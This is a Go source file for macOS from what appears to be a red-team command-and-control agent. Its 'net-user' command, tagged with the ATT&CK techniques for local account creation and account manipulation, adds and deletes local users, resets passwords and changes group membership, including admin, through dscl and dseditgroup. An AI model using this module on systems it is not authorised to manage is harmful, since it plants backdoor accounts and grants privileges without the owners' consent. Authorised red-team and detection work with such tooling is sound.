//go:build darwin

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"

	"fawkes/pkg/structs"
)

type NetUserCommand struct{}

func (c *NetUserCommand) Name() string { return "net-user" }
func (c *NetUserCommand) Description() string {
	return "Manage local user accounts and group membership (T1136.001, T1098)"
}

func (c *NetUserCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: parameters required. Actions: add, delete, info, password, group-add, group-remove")
	}

	var args netUserArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}
	defer structs.ZeroString(&args.Password)

	switch strings.ToLower(args.Action) {
	case "add":
		return darwinUserAdd(args)
	case "delete":
		return darwinUserDelete(args)
	case "info":
		return darwinUserInfo(args)
	case "password":
		return darwinUserPassword(args)
	case "group-add":
		return darwinUserGroupAdd(args)
	case "group-remove":
		return darwinUserGroupRemove(args)
	default:
		return errorf("Unknown action: %s\nAvailable: add, delete, info, password, group-add, group-remove", args.Action)
	}
}

func darwinUserAdd(args netUserArgs) structs.CommandResult {
	if args.Username == "" {
		return errorResult("Error: username is required for add action")
	}
	if args.Password == "" {
		return errorResult("Error: password is required for add action")
	}

	// Find next available UniqueID (start from 501 for regular users)
	out, err := execCmdTimeout("dscl", ".", "-list", "/Users", "UniqueID")
	if err != nil {
		return errorf("Error listing users: %v", err)
	}
	maxUID := 500
	for _, line := range strings.Split(string(out), "\n") {
		fields := strings.Fields(line)
		if len(fields) == 2 {
			var uid int
			fmt.Sscanf(fields[1], "%d", &uid)
			if uid > maxUID && uid < 65534 {
				maxUID = uid
			}
		}
	}
	nextUID := fmt.Sprintf("%d", maxUID+1)

	// Create user via dscl
	steps := []struct {
		args []string
		desc string
	}{
		{[]string{".", "-create", "/Users/" + args.Username}, "create user"},
		{[]string{".", "-create", "/Users/" + args.Username, "UserShell", "/bin/zsh"}, "set shell"},
		{[]string{".", "-create", "/Users/" + args.Username, "UniqueID", nextUID}, "set UID"},
		{[]string{".", "-create", "/Users/" + args.Username, "PrimaryGroupID", "20"}, "set GID"}, // staff group
		{[]string{".", "-create", "/Users/" + args.Username, "NFSHomeDirectory", "/Users/" + args.Username}, "set home"},
	}

	if args.FullName != "" {
		steps = append(steps, struct {
			args []string
			desc string
		}{[]string{".", "-create", "/Users/" + args.Username, "RealName", args.FullName}, "set full name"})
	}
	if args.Comment != "" {
		steps = append(steps, struct {
			args []string
			desc string
		}{[]string{".", "-create", "/Users/" + args.Username, "Comment", args.Comment}, "set comment"})
	}

	for _, step := range steps {
		if out, err := execCmdTimeout("dscl", step.args...); err != nil {
			return errorf("Error (%s): %v\n%s", step.desc, err, string(out))
		}
	}

	// Set password
	if out, err := execCmdTimeout("dscl", ".", "-passwd", "/Users/"+args.Username, args.Password); err != nil {
		return errorf("User created but password set failed: %v\n%s", err, string(out))
	}

	// Create home directory
	if out, err := execCmdTimeout("createhomedir", "-c", "-u", args.Username); err != nil {
		// Non-fatal — home dir creation may fail without root
		_ = out
	}

	return successf("Successfully created user '%s' (UID: %s)", args.Username, nextUID)
}

func darwinUserDelete(args netUserArgs) structs.CommandResult {
	if args.Username == "" {
		return errorResult("Error: username is required for delete action")
	}

	out, err := execCmdTimeout("dscl", ".", "-delete", "/Users/"+args.Username)
	if err != nil {
		return errorf("Error deleting user '%s': %v\n%s", args.Username, err, string(out))
	}

	// Try to remove home directory
	home := "/Users/" + args.Username
	if info, err := os.Stat(home); err == nil && info.IsDir() {
		os.RemoveAll(home)
	}

	return successf("Successfully deleted user '%s'", args.Username)
}

func darwinUserInfo(args netUserArgs) structs.CommandResult {
	if args.Username == "" {
		return errorResult("Error: username is required for info action")
	}

	// Read all user properties via dscl
	out, err := execCmdTimeout("dscl", ".", "-read", "/Users/"+args.Username)
	if err != nil {
		return errorf("User '%s' not found: %v", args.Username, err)
	}

	// Parse dscl output into key-value pairs
	props := parseDsclOutput(string(out))

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("User:    %s\n", args.Username))

	if v, ok := props["UniqueID"]; ok {
		sb.WriteString(fmt.Sprintf("UID:     %s\n", v))
	}
	if v, ok := props["PrimaryGroupID"]; ok {
		sb.WriteString(fmt.Sprintf("GID:     %s\n", v))
	}
	if v, ok := props["RealName"]; ok {
		sb.WriteString(fmt.Sprintf("Name:    %s\n", v))
	}
	if v, ok := props["NFSHomeDirectory"]; ok {
		sb.WriteString(fmt.Sprintf("Home:    %s\n", v))
	}
	if v, ok := props["UserShell"]; ok {
		sb.WriteString(fmt.Sprintf("Shell:   %s\n", v))
		if v == "/usr/bin/false" || v == "/sbin/nologin" {
			sb.WriteString("Login:   Disabled\n")
		} else {
			sb.WriteString("Login:   Enabled\n")
		}
	}
	if v, ok := props["Comment"]; ok && v != "" {
		sb.WriteString(fmt.Sprintf("Comment: %s\n", v))
	}

	// Check admin group membership
	groups := darwinUserGroups(args.Username)
	if len(groups) > 0 {
		sb.WriteString(fmt.Sprintf("Groups:  %s\n", strings.Join(groups, ", ")))
		for _, g := range groups {
			if g == "admin" || g == "wheel" {
				sb.WriteString("Privilege: Admin access\n")
				break
			}
		}
	}

	// Check if password is set
	if v, ok := props["AuthenticationAuthority"]; ok {
		if strings.Contains(v, "ShadowHash") {
			sb.WriteString("Password: Set (ShadowHash)\n")
		} else if strings.Contains(v, "DisabledUser") {
			sb.WriteString("Password: Disabled\n")
		}
	}

	return successResult(sb.String())
}

func darwinUserPassword(args netUserArgs) structs.CommandResult {
	if args.Username == "" {
		return errorResult("Error: username is required for password action")
	}
	if args.Password == "" {
		return errorResult("Error: password is required for password action")
	}

	out, err := execCmdTimeout("dscl", ".", "-passwd", "/Users/"+args.Username, args.Password)
	if err != nil {
		return errorf("Error setting password for '%s': %v\n%s", args.Username, err, string(out))
	}

	return successf("Successfully changed password for '%s'", args.Username)
}

func darwinUserGroupAdd(args netUserArgs) structs.CommandResult {
	if args.Username == "" {
		return errorResult("Error: username is required for group-add action")
	}
	if args.Group == "" {
		return errorResult("Error: group is required for group-add action")
	}

	out, err := execCmdTimeout("dseditgroup", "-o", "edit", "-a", args.Username, "-t", "user", args.Group)
	if err != nil {
		return errorf("Error adding '%s' to group '%s': %v\n%s", args.Username, args.Group, err, string(out))
	}

	return successf("Successfully added '%s' to group '%s'", args.Username, args.Group)
}

func darwinUserGroupRemove(args netUserArgs) structs.CommandResult {
	if args.Username == "" {
		return errorResult("Error: username is required for group-remove action")
	}
	if args.Group == "" {
		return errorResult("Error: group is required for group-remove action")
	}

	out, err := execCmdTimeout("dseditgroup", "-o", "edit", "-d", args.Username, "-t", "user", args.Group)
	if err != nil {
		return errorf("Error removing '%s' from group '%s': %v\n%s", args.Username, args.Group, err, string(out))
	}

	return successf("Successfully removed '%s' from group '%s'", args.Username, args.Group)
}

// darwinUserGroups returns all groups a user belongs to
func darwinUserGroups(username string) []string {
	out, err := execCmdTimeout("id", "-Gn", username)
	if err != nil {
		return nil
	}
	groups := strings.Fields(strings.TrimSpace(string(out)))
	return groups
}

// parseDsclOutput parses dscl -read output into key-value pairs
func parseDsclOutput(output string) map[string]string {
	props := make(map[string]string)
	var currentKey string

	for _, line := range strings.Split(output, "\n") {
		if line == "" {
			continue
		}
		if !strings.HasPrefix(line, " ") && strings.Contains(line, ":") {
			// New key-value pair
			parts := strings.SplitN(line, ":", 2)
			currentKey = strings.TrimSpace(parts[0])
			value := ""
			if len(parts) > 1 {
				value = strings.TrimSpace(parts[1])
			}
			props[currentKey] = value
		} else if currentKey != "" && strings.HasPrefix(line, " ") {
			// Continuation of previous value
			existing := props[currentKey]
			if existing != "" {
				props[currentKey] = existing + " " + strings.TrimSpace(line)
			} else {
				props[currentKey] = strings.TrimSpace(line)
			}
		}
	}

	return props
}
